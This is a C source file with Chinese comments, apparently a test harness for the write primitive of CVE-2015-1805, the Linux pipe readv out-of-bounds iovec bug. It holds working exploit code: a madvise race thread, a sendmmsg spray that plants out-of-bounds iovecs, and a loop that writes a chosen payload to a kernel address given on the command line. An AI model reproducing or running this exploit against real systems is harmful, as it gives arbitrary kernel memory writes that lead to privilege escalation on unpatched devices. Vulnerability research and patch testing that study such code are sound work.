/* SPDX-License-Identifier: GPL-3.0-or-later */

/*
 * iov1805_write_test.c — CVE-2015-1805 写原语自检（P4.2）
 *
 * 方向：readv(pipe_r, iov, 257) → pipe_read → __copy_to_user_std
 *   OOB iovec 的 iov_base 变成**写入目标**，atomic 趟没有 access_ok
 *   → 目标可以是内核地址。
 *
 * 竞态与读方向完全一致（同一个 zapper）：
 *   prefetch 是内联 strb 写 0（c0105728），会把 pR 缺页进来；
 *   zapper 在「prefetch 之后、copy 之前」madvise(MADV_DONTNEED) 清掉 PTE
 *   → copy 在 kmap_atomic 下缺页 → in_atomic → EFAULT
 *   → 重试走可睡眠 kmap，VMA 还在 → 必然重新缺页成功
 *   → 第二轮 atomic 走到 iov[257]/[258]，把管道最后 16 字节写到目标
 *
 * 布局（8192 = 2 个 pipe buffer）：
 *   iov[0] = {u0, 16}     常驻（接收 buffer1 前 16 字节）
 *   iov[1] = {pR, 4080}   zapper 页
 *   iov[2] = {u2, 4096}   常驻
 *   iov[3..256] = {NULL,0}
 *   OOB：iov[257]={target,4}、iov[258]={target+4,12}
 *        → 目标收到 buffer2 的最后 16 字节（前 4 + 后 12）
 *
 * 编译：zig cc -target arm-linux-musleabi -static -O2 -pthread -o iov1805_write_test iov1805_write_test.c
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <netinet/in.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <unistd.h>

#define NSEG      257
#define IOVECS    512
#define PG        4096
#define TOTAL     8192

static struct iovec viv[IOVECS] __attribute__((aligned(64)));
static struct iovec siv[IOVECS] __attribute__((aligned(64)));

static unsigned char *u0, *u2, *pR, *wbuf;
static uint64_t *canary;
static int pfd[2];
static int udpfd = -1;
static volatile int stop, ready;

static void pin(int cpu)
{
	cpu_set_t s;
	CPU_ZERO(&s);
	CPU_SET(cpu, &s);
	sched_setaffinity(0, sizeof(s), &s);
}

static void *zapper(void *a)
{
	(void)a;
	pin(1);
	ready = 1;
	while (!stop)
		madvise(pR, PG, MADV_DONTNEED);
	return NULL;
}

static void *spinner(void *a)
{
	(void)a;
	volatile unsigned long x = 0;
	for (unsigned long i = 0; i < 400000000UL && !stop; i++)
		x += i;
	return NULL;
}

static void spray(void)
{
	struct mmsghdr m;

	memset(&m, 0, sizeof(m));
	m.msg_hdr.msg_iov = siv;
	m.msg_hdr.msg_iovlen = IOVECS;
	m.msg_hdr.msg_control = siv;
	m.msg_hdr.msg_controllen = IOVECS * sizeof(struct iovec);
	syscall(SYS_sendmmsg, udpfd, &m, 1, MSG_DONTWAIT);
}

int main(int argc, char **argv)
{
	unsigned long max_iter = 3000;
	unsigned long kaddr = 0, payload = 0xDEADBEEFUL;
	int i;
	pthread_t th[3];

	if (argc > 1)
		max_iter = strtoul(argv[1], NULL, 0);
	if (argc > 2)
		kaddr = strtoul(argv[2], NULL, 0);
	if (argc > 3)
		payload = strtoul(argv[3], NULL, 0);

	for (i = 0; i < 2; i++)
		pthread_create(&th[i], NULL, spinner, NULL);
	sleep(2);

	if (pipe(pfd) != 0) { perror("pipe"); return 1; }
	fcntl(pfd[0], F_SETFL, fcntl(pfd[0], F_GETFL) | O_NONBLOCK);

	u0 = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	u2 = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	pR = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	wbuf = mmap(NULL, TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	canary = mmap(NULL, PG, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (!u0 || !u2 || !pR || !wbuf || !canary) { perror("mmap"); return 1; }

	/* 管道内容：buf1 全 0xA1；buf2 = 4080×0xB2 + 4 字节 0xDEADBEEF + 12 字节 0xCC */
	memset(wbuf, 0xA1, PG);
	memset(wbuf + PG, 0xB2, 4080);
	*(uint32_t *)(wbuf + PG + 4080) = (uint32_t)payload;
	memset(wbuf + PG + 4084, 0xCC, 12);

	memset(viv, 0, sizeof(viv));
	viv[0].iov_base = u0;
	viv[0].iov_len = 16;
	viv[1].iov_base = pR;
	viv[1].iov_len = 4080;
	viv[2].iov_base = u2;
	viv[2].iov_len = 4096;

	/* OOB：4 字节到 target，12 字节到 target+4（kaddr 非 0 时目标为内核地址） */
	memset(siv, 0, sizeof(siv));
	/* 4 字节 → target；12 字节 → 永远落到用户态 canary，绝不碰 target 之后 */
	siv[257].iov_base = kaddr ? (void *)kaddr : (void *)canary;
	siv[257].iov_len = 4;
	siv[258].iov_base = canary + 4;
	siv[258].iov_len = 12;

	udpfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (udpfd < 0) { perror("socket"); return 1; }
	{
		struct sockaddr_in sa;
		memset(&sa, 0, sizeof(sa));
		sa.sin_family = AF_INET;
		sa.sin_port = htons(5105);
		sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		connect(udpfd, (struct sockaddr *)&sa, sizeof(sa));
	}

	pthread_create(&th[2], NULL, zapper, NULL);
	while (!ready)
		usleep(200);

	pin(0);
	printf("[*] write primitive test, max_iter=%lu target=%s%lx\n",
	       max_iter, kaddr ? "kernel " : "user ", kaddr ? kaddr : (unsigned long)canary);
	fflush(stdout);

	for (unsigned long it = 0; it < max_iter; it++) {
		ssize_t r;

		if (write(pfd[1], wbuf, TOTAL) != TOTAL) { perror("fill"); break; }
		spray();
		r = readv(pfd[0], viv, NSEG);

		if (r > 0) {
			unsigned char tmp[64];
			while (read(pfd[0], tmp, sizeof(tmp)) > 0)
				;
		}
		if (it < 3) {
			printf("    it=%lu readv=%zd canary=%016llx %016llx\n", it, r,
			       (unsigned long long)canary[0],
			       (unsigned long long)canary[1]);
			fflush(stdout);
		}
		if (canary[0] != 0) {
			printf("[+] WROTE it=%lu canary=%016llx %016llx\n", it,
			       (unsigned long long)canary[0],
			       (unsigned long long)canary[1]);
			fflush(stdout);
			break;
		}
	}
	stop = 1;
	printf("[*] done canary=%016llx %016llx\n",
	       (unsigned long long)canary[0], (unsigned long long)canary[1]);
	return canary[0] ? 0 : 2;
}
